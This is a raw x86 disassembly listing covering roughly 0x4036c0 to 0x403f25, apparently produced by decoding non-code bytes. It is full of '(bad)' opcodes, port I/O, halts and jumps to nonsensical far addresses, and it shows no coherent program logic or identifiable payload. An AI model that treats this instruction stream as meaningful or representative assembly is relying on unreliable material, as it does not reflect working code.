  4036c0:	loope  0x40368b
  4036c2:	in     eax,dx
  4036c3:	loopne 0x4036ad
  4036c5:	repz mov eax,0xccf0d9c7
  4036cb:	imul   ch
  4036cd:	loopne 0x4036a9
  4036cf:	shl    edi,1
  4036d1:	(bad)  
  4036d2:	(bad)  
  4036d3:	in     eax,0xfd
  4036d5:	(bad)  
  4036d6:	fdivp  st(6),st
  4036d8:	out    dx,eax
  4036d9:	hlt    
  4036da:	fucomip st,st(1)
  4036dc:	add    eax,0xb0ace6e6
  4036e1:	lock ret 
  4036e3:	in     eax,0xf2
  4036e5:	mov    ah,0xf8
  4036e7:	mov    al,0xca
  4036e9:	mov    ebp,0xbbe9d7dc
  4036ee:	icebp  
  4036ef:	mul    edi
  4036f1:	fsub   st,st(1)
  4036f3:	in     eax,0xf0
  4036f5:	pop    es
  4036f6:	jmp    0xe11016d2
  4036fb:	repnz (bad) 
  4036fd:	call   0xb61f19e5
  403702:	loope  0x4036f5
  403704:	jmp    0x4036b9
  403706:	fistp  QWORD PTR [edi-0xa2d0c2a]
  40370c:	jmp    0xfc323607
  403711:	fsub   st,st(2)
  403713:	loopne 0x4036d9
  403715:	out    0xca,al
  403717:	fmul   st,st(2)
  403719:	loop   0x4036ff
  40371b:	loope  0x403719
  40371d:	mov    ebp,0xcccfdcad
  403722:	(bad)  
  403723:	out    dx,al
  403724:	in     eax,dx
  403725:	icebp  
  403726:	lock hlt 
  403728:	retf   
  403729:	int    0xd2
  40372b:	imul   al
  40372d:	cmc    
  40372e:	mov    ebp,0x2bc05fa
  403733:	icebp  
  403734:	std    
  403735:	fisttp DWORD PTR [edi]
  403737:	call   0x21d1b47
  40373c:	rcr    bh,0xc1
  40373f:	shl    DWORD PTR [eax+esi*8-0x300b304b],1
  403746:	ror    edx,1
  403748:	jmp    0xef35f329
  40374d:	idiv   eax
  40374f:	mov    edi,0xf3f007e0
  403754:	sar    ch,0xc7
  403757:	or     eax,DWORD PTR [edi+ebp*8]
  40375a:	or     ah,ah
  40375c:	or     dh,BYTE PTR [ebx-0x362a2d20]
  403762:	lods   eax,DWORD PTR ds:[esi]
  403763:	shr    eax,0xea
  403766:	clc    
  403767:	aad    0xc4
  403769:	shr    ebp,1
  40376b:	fcomip st,st(6)
  40376d:	fucomip st,st(4)
  40376f:	add    esp,esi
  403771:	int    0xe5
  403773:	lock out 0x6,eax
  403776:	retf   0xd900
  403779:	add    eax,0xac0306eb
  40377e:	faddp  st(0),st
  403780:	(bad)  
  403781:	mul    bh
  403783:	mov    ebx,0xc5b8e7c6
  403788:	fstp   TBYTE PTR [ebx-0x1320b32]
  40378e:	stc    
  40378f:	repz fdivr st,st(7)
  403792:	stc    
  403793:	stc    
  403794:	out    0xc6,al
  403796:	add    ebp,edx
  403798:	call   0xf84a0ba4
  40379d:	out    dx,eax
  40379e:	stos   BYTE PTR es:[edi],al
  40379f:	out    0xa4,al
  4037a1:	loop   0x403799
  4037a3:	cmc    
  4037a4:	jmp    0xb10b0292
  4037a9:	fcmovbe st,st(3)
  4037ab:	mov    esi,0xffd3b9d1
  4037b0:	(bad)  
  4037b1:	cmc    
  4037b2:	fcmovnb st,st(6)
  4037b4:	(bad)  
  4037b6:	or     edi,esp
  4037b8:	add    bh,dl
  4037ba:	out    dx,al
  4037bb:	or     al,0x1
  4037bd:	leave  
  4037be:	icebp  
  4037bf:	mov    bh,0xf5
  4037c1:	jmp    0xf6d5:0xb3e9e5c4
  4037c8:	(bad)  
  4037c9:	mov    esi,0xbbdbffd7
  4037ce:	add    eax,esi
  4037d0:	clc    
  4037d1:	cli    
  4037d2:	in     al,0xe1
  4037d4:	repnz cmc 
  4037d6:	leave  
  4037d7:	fstp   st(3)
  4037d9:	fld    DWORD PTR [eax]
  4037db:	loopne 0x4037c5
  4037dd:	mov    ecx,0xccf3d0cc
  4037e2:	mov    al,0xeb
  4037e4:	mov    ch,0xb4
  4037e6:	jmp    0x4037ac
  4037e8:	into   
  4037e9:	mov    dh,0xd6
  4037eb:	int    0xf2
  4037ed:	repnz lock pop es
  4037f0:	int    0xe1
  4037f2:	rcr    edi,0xd6
  4037f5:	(bad)  
  4037f7:	in     eax,0x0
  4037f9:	loopne 0x4037bd
  4037fb:	(bad)  
  4037fd:	mov    dl,0xe0
  4037ff:	mov    al,0xe9
  403801:	jmp    0xeff305d7
  403806:	int    0xf3
  403808:	(bad)  
  403809:	shl    ah,cl
  40380b:	mov    ecx,0xf800c9f4
  403810:	xlat   BYTE PTR ds:[ebx]
  403811:	ffreep st(0)
  403813:	rol    al,cl
  403815:	stc    
  403816:	pop    es
  403817:	fisttp QWORD PTR [eax]
  403819:	push   cs
  40381a:	stc    
  40381b:	cld    
  40381c:	push   cs
  40381d:	in     al,0xa6
  40381f:	mov    esp,0xd7c2c4c0
  403824:	loop   0x403814
  403826:	mov    eax,0xb6f2eedf
  40382b:	jecxz  0x4037f7
  40382d:	mov    ecx,0xfbd0f2ec
  403832:	hlt    
  403833:	loopne 0x40382d
  403835:	lock (bad) 
  403838:	loop   0x403834
  40383a:	enter  0xfd08,0xad
  40383e:	(bad)
  403841:	test   edi,0xd3f9faeb
  403847:	retf   0xcbd6
  40384a:	mov    eax,0xbcefe8f2
  40384f:	into   
  403850:	jecxz  0x403828
  403852:	std    
  403853:	(bad)  
  403854:	ret    0xfdd0
  403857:	fstp   st(1)
  403859:	stc    
  40385a:	add    dl,cl
  40385c:	cld    
  40385d:	jmp    0xc5f5:0xb7ade6b1
  403864:	out    0xb6,eax
  403866:	sar    edi,1
  403868:	cli    
  403869:	mov    ah,0xf4
  40386b:	retf   
  40386c:	cld    
  40386d:	enter  0xf8bf,0xe0
  403871:	(bad)  
  403873:	rol    ebp,1
  403875:	(bad)  
  403876:	fimul  DWORD PTR [ebx]
  403878:	add    bh,ch
  40387a:	ret    0xc9ff
  40387d:	retf   
  40387e:	(bad)  
  40387f:	in     al,0xe3
  403881:	int3   
  403882:	lds    esi,FWORD PTR [esi-0x48120d0c]
  403888:	jmp    0xd3fb3866
  40388d:	repnz add esi,esi
  403890:	ret    
  403891:	repz ftst 
  403894:	in     al,0xf6
  403896:	out    dx,eax
  403897:	or     esp,esp
  403899:	out    dx,al
  40389a:	out    dx,al
  40389b:	out    dx,eax
  40389c:	loop   0x40385f
  40389e:	mov    bl,0xd1
  4038a0:	out    0xc8,eax
  4038a2:	(bad)  
  4038a3:	retf   
  4038a4:	ror    edx,0xb8
  4038a7:	jmp    0xcede:0xecf6f3b4
  4038ae:	(bad)  
  4038b0:	loopne 0x40386f
  4038b2:	mov    ebp,0xfbe1c3c6
  4038b7:	aad    0xe7
  4038b9:	retf   
  4038ba:	(bad)  
  4038bc:	or     ebp,esi
  4038be:	test   eax,0xb6b6d5e8
  4038c3:	lods   al,BYTE PTR ds:[esi]
  4038c4:	repz in eax,dx
  4038c6:	stc    
  4038c7:	lock mov esi,0xcdbeddb9
  4038cd:	clc    
  4038ce:	sar    dh,1
  4038d0:	cld    
  4038d1:	add    eax,0xc500fde1
  4038d6:	fnstsw ax
  4038d8:	out    0xc3,eax
  4038da:	or     DWORD PTR [ecx],ecx
  4038dc:	out    0xaa,eax
  4038de:	jmp    0xc5eb:0xb4cbb2c1
  4038e5:	div    DWORD PTR [edi+esi*4-0x33141a25]
  4038ec:	mov    edi,0xd7b802f1
  4038f1:	fcmovne st,st(4)
  4038f3:	rol    DWORD PTR [edi],1
  4038f5:	call   0xe63ef9e5
  4038fa:	add    esi,ecx
  4038fc:	fucomip st,st(3)
  4038fe:	retf   0xe4ca
  403901:	mov    esp,0xb9b7e4e8
  403906:	shl    esp,1
  403908:	(bad)  
  403909:	mov    bl,0xcb
  40390b:	into   
  40390c:	loop   0x4038fd
  40390e:	mov    dh,0xb5
  403910:	mov    ah,0xfa
  403912:	add    al,0xf6
  403914:	fcmovbe st,st(4)
  403916:	or     BYTE PTR ds:0x12e2d4ee,al
  40391c:	add    ch,dl
  40391e:	mov    dl,0xe6
  403920:	shl    bl,1
  403922:	int3   
  403923:	call   0xd7fa32f5
  403928:	(bad)  
  403929:	in     eax,dx
  40392a:	jmp    0x40391d
  40392c:	out    dx,al
  40392d:	out    dx,eax
  40392e:	mov    ecx,0xd5dedcdd
  403933:	loop   0x403917
  403935:	shr    cl,0xdc
  403938:	aam    0xc9
  40393a:	or     ah,ch
  40393c:	icebp  
  40393d:	shl    bh,0xb0
  403940:	int3   
  403941:	jmp    0xb6b7:0xb2d4edc6
  403948:	sar    DWORD PTR [esi-0x2b301202],cl
  40394e:	aad    0xd4
  403950:	add    ah,dl
  403952:	aad    0x7
  403954:	stc    
  403955:	call   0xca01135b
  40395a:	ret    0xe0fe
  40395d:	retf   
  40395e:	repz out 0xae,al
  403961:	repz into 
  403963:	in     eax,dx
  403964:	mov    ebx,0xfeb7b7b6
  403969:	repnz xlat BYTE PTR ds:[ebx]
  40396b:	retf   0xe8e9
  40396e:	aad    0xd4
  403970:	fdecstp 
  403972:	fdivr  st(7),st
  403974:	(bad)  
  403976:	in     al,0xd7
  403978:	hlt    
  403979:	fstp   st(1)
  40397b:	inc    BYTE PTR [ecx]
  40397d:	shl    al,cl
  40397f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403980:	ret    
  403981:	repz in eax,0xa9
  403984:	mov    cl,0xd7
  403986:	retf   
  403987:	(bad)  
  403988:	mov    edx,0xfed9bdcd
  40398d:	(bad)  
  40398f:	clc    
  403990:	in     eax,dx
  403991:	(bad)  
  403992:	out    0xb9,eax
  403994:	aam    0xc4
  403996:	clc    
  403997:	or     dh,dh
  403999:	fabs   
  40399b:	fcmove st,st(4)
  40399d:	mov    eax,0xadf2f2c2
  4039a2:	fsub   st(1),st
  4039a4:	ror    bl,cl
  4039a6:	into   
  4039a7:	(bad)  
  4039a8:	rcl    al,1
  4039aa:	(bad)  
  4039ac:	idiv   dl
  4039ae:	clc    
  4039af:	(bad)  
  4039b1:	test   BYTE PTR [ebx],0xc5
  4039b4:	or     bh,ch
  4039b6:	fsubr  st(7),st
  4039b8:	iret   
  4039b9:	(bad)  
  4039ba:	(bad)  
  4039bc:	leave  
  4039bd:	fnstenv [ecx-0x191c3351]
  4039c3:	(bad)  
  4039c4:	div    DWORD PTR [esp+ebp*8-0x35311353]
  4039cb:	fsin   
  4039cd:	cld    
  4039ce:	icebp  
  4039cf:	(bad)  
  4039d0:	add    esi,edi
  4039d2:	out    0x7,al
  4039d4:	loopne 0x4039e0
  4039d6:	retf   
  4039d7:	enter  0xc405,0xe1
  4039db:	repz or ah,cl
  4039de:	fmul   st(4),st
  4039e0:	fsub   st(0),st
  4039e2:	xlat   BYTE PTR ds:[ebx]
  4039e3:	(bad)  
  4039e4:	xlat   BYTE PTR ds:[ebx]
  4039e5:	mov    ecx,0xd0e5eedb
  4039ea:	aad    0xcf
  4039ec:	(bad)  
  4039ed:	mov    ecx,0xbdd9f8d2
  4039f2:	out    0xc0,eax
  4039f4:	retf   
  4039f5:	retf   
  4039f6:	aam    0xa
  4039f8:	(bad)  
  4039f9:	hlt    
  4039fa:	hlt    
  4039fb:	jmp    0x4039c6
  4039fd:	retf   0xf0cf
  403a00:	loopne 0x4039f7
  403a02:	rol    edi,0xb1
  403a05:	shl    ah,1
  403a07:	out    0xca,eax
  403a09:	hlt    
  403a0a:	jmp    0xbc410ee9
  403a0f:	int3   
  403a10:	in     eax,0xe7
  403a12:	sti    
  403a13:	repnz fild WORD PTR [ecx+ebp*8]
  403a17:	fchs   
  403a19:	fcmovnu st,st(4)
  403a1b:	push   cs
  403a1c:	in     eax,0xc2
  403a1e:	(bad)  
  403a20:	mov    dl,0xd0
  403a22:	shl    dl,0xef
  403a25:	out    0xb7,al
  403a27:	mov    cl,0xf1
  403a29:	cmc    
  403a2a:	mov    esi,0xfef9f7b1
  403a2f:	into   
  403a30:	shl    edx,0xba
  403a33:	retf   
  403a34:	fsubr  st,st(2)
  403a36:	aad    0x6
  403a38:	frndint 
  403a3a:	retf   
  403a3b:	or     eax,0xe0c7c8ff
  403a40:	lds    ebp,FWORD PTR [edi+edx*8-0xf113518]
  403a47:	mov    edx,0xf0bac4ce
  403a4c:	stc    
  403a4d:	cli    
  403a4e:	loope  0x403a24
  403a50:	loope  0x403a2f
  403a52:	clc    
  403a53:	fucomp st(2)
  403a55:	aam    0xd6
  403a57:	or     dh,ah
  403a59:	push   es
  403a5a:	loope  0x403a60
  403a5c:	iret   
  403a5d:	mov    dl,0xd3
  403a5f:	mov    al,0xb2
  403a61:	mov    ebp,0xebb7d6c6
  403a66:	scas   al,BYTE PTR es:[edi]
  403a67:	cmc    
  403a68:	retf   
  403a69:	(bad)
  403a6c:	jmp    0xc1df:0xfabedfbb
  403a73:	icebp  
  403a74:	add    ebx,ebp
  403a76:	mul    ch
  403a78:	add    eax,DWORD PTR [edx]
  403a7a:	les    eax,FWORD PTR [edx]
  403a7c:	int    0xee
  403a7e:	test   al,0xe5
  403a80:	fsubr  st(0),st
  403a82:	(bad)  
  403a83:	fcomi  st,st(1)
  403a85:	int    0xd9
  403a87:	fcmovne st,st(1)
  403a89:	fcmovu st,st(2)
  403a8b:	ret    
  403a8c:	enter  0xc1d6,0x7
  403a90:	fneni(8087 only) 
  403a92:	(bad)  
  403a93:	out    0xc2,al
  403a95:	in     al,0xc6
  403a97:	cli    
  403a98:	add    bh,al
  403a9a:	adc    ebx,ecx
  403a9c:	clc    
  403a9d:	in     al,0xc3
  403a9f:	retf   
  403aa0:	(bad)  
  403aa1:	(bad)  
  403aa3:	out    dx,eax
  403aa4:	shl    cl,1
  403aa6:	in     al,dx
  403aa7:	int3   
  403aa8:	retf   
  403aa9:	int3   
  403aaa:	fstp   st(1)
  403aac:	xlat   BYTE PTR ds:[ebx]
  403aad:	aam    0xb9
  403aaf:	fdivrp st(3),st
  403ab1:	mul    ebp
  403ab3:	loop   0x403aa0
  403ab5:	fcomi  st,st(7)
  403ab7:	fxtract 
  403ab9:	loop   0x403aa2
  403abb:	add    ecx,ebx
  403abd:	in     eax,0xad
  403abf:	test   eax,0xc0d7efe3
  403ac4:	out    dx,al
  403ac5:	mov    cl,0xb0
  403ac7:	in     al,dx
  403ac8:	mov    al,0xce
  403aca:	repnz add edx,edi
  403acd:	(bad)  
  403ace:	std    
  403acf:	aam    0xfb
  403ad1:	mov    ebp,0xf9fef5f8
  403ad6:	cmc    
  403ad7:	add    ebp,edi
  403ad9:	in     al,0x9
  403adb:	cli    
  403adc:	jmp    0xc82926d4
  403ae1:	mov    ch,0xdb
  403ae3:	repz cli 
  403ae5:	shr    ebx,cl
  403ae7:	(bad)  
  403ae8:	(bad)  
  403ae9:	cmc    
  403aea:	fcomp  st(2)
  403aec:	repz int 0xc1
  403aef:	ret    
  403af0:	sar    BYTE PTR [esi-0x2af42e3a],1
  403af6:	fucomi st,st(1)
  403af8:	(bad)  
  403af9:	out    dx,eax
  403afa:	fild   DWORD PTR [eax+eiz*8]
  403afd:	lods   eax,DWORD PTR ds:[esi]
  403afe:	int    0xe2
  403b00:	mov    dh,0xe8
  403b02:	mov    ch,0xd2
  403b04:	in     eax,0xfa
  403b06:	sti    
  403b07:	mov    edi,0xdae4b6b5
  403b0c:	hlt    
  403b0d:	repz in al,dx
  403b0f:	inc    DWORD PTR [ecx]
  403b11:	loopne 0x403af9
  403b13:	icebp  
  403b14:	loop   0x403aec
  403b16:	stc    
  403b17:	aad    0xe5
  403b19:	add    BYTE PTR [eax],al
  403b1b:	fdiv   st(4),st
  403b1d:	ret    
  403b1e:	repz int 0xc9
  403b21:	in     al,0xae
  403b23:	hlt    
  403b24:	mov    ah,0xb5
  403b26:	iret   
  403b27:	retf   0xf0b0
  403b2a:	repz in al,dx
  403b2c:	fcmove st,st(1)
  403b2e:	fsubrp st(7),st
  403b30:	mov    eax,0xfbebdbf8
  403b35:	or     dl,ch
  403b37:	(bad)  
  403b39:	in     al,dx
  403b3a:	std    
  403b3b:	or     eax,DWORD PTR [edi]
  403b3d:	lods   al,BYTE PTR ds:[esi]
  403b3e:	mov    esi,0xb5ecddbe
  403b43:	in     al,0xb2
  403b45:	enter  0xb8b5,0xc4
  403b49:	lock out dx,eax
  403b4b:	sti    
  403b4c:	stc    
  403b4d:	jecxz  0x403b45
  403b4f:	fst    st(2)
  403b51:	int    0xda
  403b53:	(bad)  
  403b54:	in     al,0x3
  403b56:	or     ah,bh
  403b58:	or     eax,0xe5e5eae3
  403b5d:	(bad)
  403b61:	call   0xc83a311b
  403b66:	leave  
  403b67:	jmp    0xca:0xd7d3cad0
  403b6e:	cld    
  403b6f:	div    BYTE PTR [esp+ecx*8-0x351a2143]
  403b76:	shl    ch,0x4
  403b79:	in     al,0xcf
  403b7b:	jecxz  0x403b80
  403b7d:	(bad)  
  403b7f:	in     eax,0xf5
  403b81:	jmp    0xe8121149
  403b86:	mov    ch,0xd0
  403b88:	mov    edx,0xfecab8da
  403b8d:	mov    ebx,0xbfbefdd4
  403b92:	aam    0xe2
  403b94:	retf   0xddc2
  403b97:	iret   
  403b98:	or     ebp,esp
  403b9a:	int3   
  403b9b:	psraw  mm4,mm6
  403b9e:	ret    0xaed1
  403ba1:	mov    ebp,0xf2f6ccc4
  403ba6:	jmp    0x403b55
  403ba8:	mov    dh,0xb8
  403baa:	mov    ch,0xf1
  403bac:	retf   0xf9df
  403baf:	mov    ch,0xf5
  403bb1:	add    cl,ah
  403bb3:	icebp  
  403bb4:	ret    
  403bb5:	fsub   st,st(0)
  403bb7:	shl    ebp,0xd9
  403bba:	in     eax,0xdb
  403bbc:	out    0xca,eax
  403bbe:	rol    cl,0xd2
  403bc1:	in     al,dx
  403bc2:	(bad)  
  403bc3:	in     al,dx
  403bc4:	lock aad 0xcc
  403bc7:	fcos   
  403bc9:	repz dec esi
  403bcc:	lock loopne 0x403bae
  403bcf:	cmc    
  403bd0:	int    0xf9
  403bd2:	int3   
  403bd3:	fcomp  st(6)
  403bd5:	cli    
  403bd6:	test   ebx,0xfd02e3fe
  403bdc:	or     ah,dh
  403bde:	retf   
  403bdf:	call   0xf1ee10ab
  403be4:	into   
  403be5:	mov    bl,0xc8
  403be7:	jmp    0xc9d2:0xf7f6f3eb
  403bee:	idiv   DWORD PTR [eax+edi*4-0xb041f22]
  403bf5:	out    0x1,eax
  403bf7:	sti    
  403bf8:	out    0x2,eax
  403bfa:	jecxz  0x403be9
  403bfc:	retf   
  403bfd:	shr    bl,0xb7
  403c00:	rcl    dh,cl
  403c02:	repz jmp 0xd735fcfa
  403c08:	mov    ch,0xb7
  403c0a:	fcmovne st,st(3)
  403c0c:	icebp  
  403c0d:	clc    
  403c0e:	enter  0xf0fa,0xc0
  403c12:	add    edi,ebp
  403c14:	add    ch,al
  403c16:	aam    0x7
  403c18:	push   es
  403c19:	(bad)  
  403c1b:	fmul   st,st(3)
  403c1d:	in     eax,dx
  403c1e:	mul    eax
  403c20:	in     al,0xd1
  403c22:	repz ret 0xdaf0
  403c26:	repnz mul dh
  403c29:	mov    eax,0xd6fbecdd
  403c2e:	into   
  403c2f:	out    dx,eax
  403c30:	in     eax,dx
  403c31:	in     al,0xf4
  403c33:	loop   0x403c1a
  403c35:	ret    
  403c36:	out    dx,eax
  403c37:	mov    ebp,0xca00ecca
  403c3c:	jmp    0xb1d7:0xccf2efad
  403c43:	into   
  403c44:	mov    al,0xf3
  403c46:	iret   
  403c47:	in     al,0xb4
  403c49:	icebp  
  403c4a:	stc    
  403c4b:	jmp    0xd1401932
  403c50:	hlt    
  403c51:	shl    ecx,0xd5
  403c54:	jmp    0x403c41
  403c56:	inc    BYTE PTR [edx+eax*1]
  403c59:	cld    
  403c5a:	jmp    0xe1ee:0xaeafc4e5
  403c61:	retf   
  403c62:	stos   BYTE PTR es:[edi],al
  403c63:	shl    edi,cl
  403c65:	icebp  
  403c66:	jmp    0xf702:0xb2dbd4c9
  403c6d:	(bad)  
  403c6e:	repz lock loopne 0x403c64
  403c72:	test   dh,0xe5
  403c75:	jmp    0x403c5c
  403c77:	retf   
  403c78:	enter  0xe1ea,0xce
  403c7c:	out    dx,al
  403c7d:	out    0xd3,eax
  403c7f:	fistp  QWORD PTR [edi+ecx*8-0xa180554]
  403c86:	jmp    0xfd331246
  403c8b:	mov    eax,0xd6dbbbf2
  403c90:	fcmovu st,st(7)
  403c92:	rol    ecx,0xd0
  403c95:	mov    edi,0xdcffdd01
  403c9a:	int    0xec
  403c9c:	jmp    0x403c81
  403c9e:	int    0xc9
  403ca0:	shl    BYTE PTR [esi-0x194f4931],0xe4
  403ca7:	shl    BYTE PTR [ebp+ebx*8-0x2631472e],cl
  403cae:	fsubp  st(4),st
  403cb0:	(bad)  
  403cb1:	std    
  403cb2:	jmp    0x403c95
  403cb4:	ret    
  403cb5:	or     ebp,edi
  403cb7:	fyl2xp1 
  403cb9:	(bad)  
  403cba:	out    0xe1,al
  403cbc:	jmp    0xdce3:0xd1c2adce
  403cc3:	test   eax,0xb6daefc5
  403cc8:	(bad)  
  403cc9:	mov    edi,0xffc2effd
  403cce:	fadd   st,st(3)
  403cd0:	shr    ch,0xbe
  403cd3:	jmp    0xd4e0:0xdde60ac2
  403cda:	stc    
  403cdb:	add    edi,ebp
  403cdd:	repz icebp 
  403cdf:	in     al,dx
  403ce0:	jmp    0xfa3af0d8
  403ce5:	scas   eax,DWORD PTR es:[edi]
  403ce6:	shr    DWORD PTR [ebp-0x724022f],1
  403cec:	shl    dl,1
  403cee:	cli    
  403cef:	repz (bad) 
  403cf2:	add    ecx,edx
  403cf4:	inc    BYTE PTR [edi]
  403cf6:	in     eax,0xfd
  403cf8:	jmp    0xd3a0cc4
  403cfd:	test   al,0xbd
  403cff:	scas   al,BYTE PTR es:[edi]
  403d00:	shl    DWORD PTR [ebp-0xf290e4b],cl
  403d06:	stc    
  403d07:	fcomp  st(6)
  403d09:	clc    
  403d0a:	int3   
  403d0b:	in     al,dx
  403d0c:	cld    
  403d0d:	mov    bh,0xda
  403d0f:	iret   
  403d10:	mov    ah,0xd8
  403d12:	(bad)  
  403d14:	cmc    
  403d15:	add    al,0xdf
  403d17:	jmp    0x403ce0
  403d19:	in     al,0x9
  403d1b:	int    0xce
  403d1d:	ret    0xd1f7
  403d20:	in     eax,0xc2
  403d22:	repnz retf 0xebd9
  403d26:	mov    ch,0xe4
  403d28:	call   ebp
  403d2a:	imul   bl
  403d2c:	in     eax,dx
  403d2d:	mov    ebp,0xf6bfc3c8
  403d32:	mov    eax,0xfe03c2d5
  403d38:	(bad)  
  403d3a:	jmp    0xa8b1:0xe4e80e00
  403d41:	mov    bl,0xf5
  403d43:	test   eax,0xb8eff6ce
  403d48:	call   ecx
  403d4a:	xlat   BYTE PTR ds:[ebx]
  403d4b:	cli    
  403d4c:	retf   0xfdef
  403d4f:	repnz in eax,0xc0
  403d52:	mov    edx,0xd0fa01fe
  403d57:	fisttp WORD PTR [ecx]
  403d59:	hlt    
  403d5a:	fnsetpm(287 only) 
  403d5c:	or     eax,0xe6cdb1e3
  403d61:	scas   eax,DWORD PTR es:[edi]
  403d62:	mov    dh,0xd7
  403d64:	out    0xfa,eax
  403d66:	mov    edx,0xcbebb8f8
  403d6b:	out    dx,eax
  403d6c:	fdivrp st(5),st
  403d6e:	int    0xef
  403d70:	jecxz  0x403d2d
  403d72:	(bad)  
  403d74:	cli    
  403d75:	mov    edi,0xe0fbf9de
  403d7a:	std    
  403d7b:	add    BYTE PTR [edx],cl
  403d7d:	jmp    0xdae2:0xc8bda9bd
  403d84:	test   ch,0xdf
  403d87:	in     al,0xc9
  403d89:	mov    dh,0xd8
  403d8b:	mov    ebp,0xf9f703fe
  403d90:	lock cli 
  403d92:	or     eax,edx
  403d94:	lds    eax,FWORD PTR ds:0xc90aeac5
  403d9a:	add    eax,0xa9e3e6e0
  403d9f:	test   al,0xbc
  403da1:	into   
  403da2:	int3   
  403da3:	loop   0x403d59
  403da5:	xlat   BYTE PTR ds:[ebx]
  403da6:	fdivr  st,st(3)
  403da8:	(bad)  
  403daa:	aam    0xde
  403dac:	hlt    
  403dad:	aam    0xcd
  403daf:	repnz (bad) 
  403db1:	out    0xf7,eax
  403db3:	fsubp  st(2),st
  403db5:	ret    0x5d6
  403db8:	into   
  403db9:	out    dx,al
  403dba:	add    eax,0xacf2c9df
  403dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dc0:	rcl    dh,cl
  403dc2:	mov    bh,0xc9
  403dc4:	cmc    
  403dc5:	out    0xf6,al
  403dc7:	xlat   BYTE PTR ds:[ebx]
  403dc8:	repz int3 
  403dca:	std    
  403dcb:	fsubr  st(2),st
  403dcd:	jecxz  0x403d8b
  403dcf:	mov    ch,0xe0
  403dd1:	loope  0x403d8d
  403dd3:	ret    0xf0d7
  403dd6:	enter  0x7ea,0xfb
  403dda:	in     al,dx
  403ddb:	(bad)  
  403ddc:	out    0xe0,al
  403dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de0:	mov    ebp,0xb7ecf0af
  403de5:	aam    0xe9
  403de7:	retf   
  403de8:	jmp    0x403de6
  403dea:	mov    edi,0xd0ccdefb
  403def:	in     al,dx
  403df0:	fcmovnu st,st(0)
  403df2:	in     al,dx
  403df3:	add    eax,0xe900eb00
  403df8:	loope  0x403dce
  403dfa:	(bad)  
  403dfc:	(bad)  
  403dfd:	leave  
  403dfe:	scas   al,BYTE PTR es:[edi]
  403dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e00:	(bad)  
  403e01:	call   0xc20ce7bc
  403e06:	imul   cl
  403e08:	int3   
  403e09:	mov    ebp,0xf403f4f7
  403e0e:	sar    DWORD PTR [eax+ebx*8-0x3c2c1328],cl
  403e15:	or     al,bl
  403e17:	add    BYTE PTR [ecx],cl
  403e19:	loop   0x403df7
  403e1b:	inc    DWORD PTR [eax]
  403e1d:	ret    0xe8ef
  403e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e21:	xlat   BYTE PTR ds:[ebx]
  403e22:	mov    esp,0xf2f7e5e4
  403e27:	neg    dl
  403e29:	(bad)  
  403e2a:	lock lock xlat BYTE PTR ds:[ebx]
  403e2d:	neg    ebp
  403e2f:	add    dh,ch
  403e31:	fcompp 
  403e33:	repnz or edi,edx
  403e36:	fisttp WORD PTR [ebx]
  403e38:	cli    
  403e39:	fmul   st(0),st
  403e3b:	add    eax,0xdfe1c9e6
  403e40:	mov    bl,0xbd
  403e42:	shl    DWORD PTR [ecx-0x440a0d11],0xd3
  403e49:	repnz mov edi,0xd3d6e9d5
  403e4f:	(bad)  
  403e51:	mov    esp,0xf904d6d3
  403e56:	xlat   BYTE PTR ds:[ebx]
  403e57:	jmp    0xf84f295c
  403e5c:	loopne 0x403e06
  403e5e:	xlat   BYTE PTR ds:[ebx]
  403e5f:	fisub  WORD PTR [ebp+ebp*4-0x4845251c]
  403e66:	(bad)  
  403e67:	jmp    0x403e2f
  403e69:	in     al,0xeb
  403e6b:	add    ecx,esi
  403e6d:	cld    
  403e6e:	aad    0xf2
  403e70:	(bad)  
  403e71:	(bad)  
  403e72:	in     al,0xc1
  403e74:	retf   0xe0e4
  403e77:	enter  0xcae2,0xf8
  403e7b:	clc    
  403e7c:	retf   
  403e7d:	repnz test al,0xf0
  403e80:	rcl    esi,1
  403e82:	lock mov bh,0xc7
  403e85:	leave  
  403e86:	(bad)  
  403e87:	shl    ebp,cl
  403e89:	aam    0xd3
  403e8b:	repnz repz stc 
  403e8e:	iret   
  403e8f:	shr    esp,1
  403e91:	aad    0xbe
  403e93:	not    dl
  403e95:	out    0xdf,al
  403e97:	fsubr  st(0),st
  403e99:	or     esp,ecx
  403e9b:	out    dx,al
  403e9c:	add    al,0xb9
  403e9e:	in     eax,0xad
  403ea0:	mul    dl
  403ea2:	jmp    0x403e77
  403ea4:	repnz sti 
  403ea6:	jmp    0x2ef:0xdecfd1ee
  403ead:	rol    edx,1
  403eaf:	aad    0xd3
  403eb1:	mov    DWORD PTR [edx],0xe408f001
  403eb7:	(bad)  
  403eb8:	(bad)  
  403eb9:	fsubp  st(7),st
  403ebb:	in     al,0x5
  403ebd:	(bad)  
  403ebe:	in     eax,0xf6
  403ec0:	call   0xfa030c75
  403ec5:	jmp    0x403e82
  403ec7:	out    0xd9,eax
  403ec9:	mov    bh,0xf8
  403ecb:	aam    0xd4
  403ecd:	fiadd  WORD PTR [ebx]
  403ecf:	int3   
  403ed0:	idiv   BYTE PTR [edi-0x18273921]
  403ed6:	(bad)  
  403ed8:	sti    
  403ed9:	or     al,0xcb
  403edb:	enter  0xe00b,0xeb
  403edf:	in     al,dx
  403ee0:	mov    bl,0xef
  403ee2:	(bad)  
  403ee3:	aad    0xd5
  403ee5:	ror    bl,cl
  403ee7:	out    dx,eax
  403ee8:	mov    eax,0xb4faf5dc
  403eed:	std    
  403eee:	loop   0x403ec6
  403ef0:	add    ch,bl
  403ef2:	stc    
  403ef3:	jmp    0x403ebf
  403ef5:	aam    0xd0
  403ef7:	aad    0xf6
  403ef9:	mov    dh,0xef
  403efc:	stc    
  403efd:	fadd   st(7),st
  403eff:	repz mov dl,0xcd
  403f02:	out    dx,eax
  403f03:	aad    0xb0
  403f05:	imul   bh
  403f07:	into   
  403f08:	out    dx,al
  403f09:	repnz std 
  403f0b:	cld    
  403f0c:	cmc    
  403f0d:	std    
  403f0e:	mov    esi,0xbcc0e3f2
  403f13:	add    ebx,esi
  403f15:	mov    edi,0xc8fde9c0
  403f1a:	or     esi,ecx
  403f1c:	in     al,0xe5
  403f1e:	call   0xd7330a02
  403f23:	loopne 0x403ef9
  403f25:	xlat   BYTE PTR ds:[ebx]
